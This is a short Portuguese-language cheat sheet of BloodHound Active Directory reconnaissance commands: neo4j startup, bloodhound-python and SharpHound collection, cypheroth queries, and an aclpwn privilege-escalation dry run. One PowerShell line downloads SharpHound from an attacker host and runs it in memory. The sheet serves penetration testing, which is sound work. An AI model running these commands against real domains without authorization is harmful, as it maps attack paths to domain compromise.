# bloodhound

% bloodhound, Active directory enumeration


## inicia o servidor neo4j
#plateform/linux #target/serve #cat/UTILS
https://neo4j.com/docs/

```bash
neo4j start
```

## bloodhound - inicia o IHM
#plateform/linux #target/local #cat/RECON
https://github.com/BloodHoundAD/BloodHound

```bash
bloodhound
```

## bloodhound - coleta dados
#plateform/linux #target/remote #port/389 #port/631 #cat/RECON
https://github.com/fox-it/BloodHound.py

```bash
bloodhound-python -d <domain> -u <user> -p <password> -c all
```

## bloodhound - coleta dados (modo alternativo)
#plateform/linux #target/remote #port/389 #port/631 #cat/RECON
https://github.com/fox-it/BloodHound.py

```bash
bloodhound-python -d <domain> -u <user> -p <password> -gc <global_catalog> -dc <domain_controler> -c all
```

## sharphound - coleta dados do bloodhound
#plateform/windows #target/remote #port/389 #port/631 #cat/RECON
https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors

```powershell
import-module sharphound.ps1
invoke-bloodhound -collectionmethod all -domain <domain>
```

## sharphound - coleta dados do bloodhound, faz download e executa
#plateform/windows #target/remote #port/389 #port/631 #cat/RECON
https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors

```powershell
(new-object system.net.webclient).downloadstring('http://<lhost>/SharpHound.ps1') | Invoke-BloodHound -CollectionMethod All  -domain <domain>
```

## cypheroth - iniciar
#plateform/linux #target/local #cat/RECON 
Toolset that runs cypher queries against Bloodhound's Neo4j backend and saves output to spreadsheets.

https://github.com/seajaysec/cypheroth

```bash
cypheroth -u <bh_user|neo4j> -p <bh_password|exegol4thewin> -d <domain>
```

## aclpwn - do computador ao dominio - simulação
#plateform/linux #target/local #cat/RECON 

Aclpwn.py é uma ferramenta que interage com o BloodHound para identificar e exploitar caminhos para escalação de privilégios baseando-se em ACLs
https://github.com/fox-it/aclpwn.py

```
aclpwn -f <computer_name> -ft computer -d <domain> -dry
```


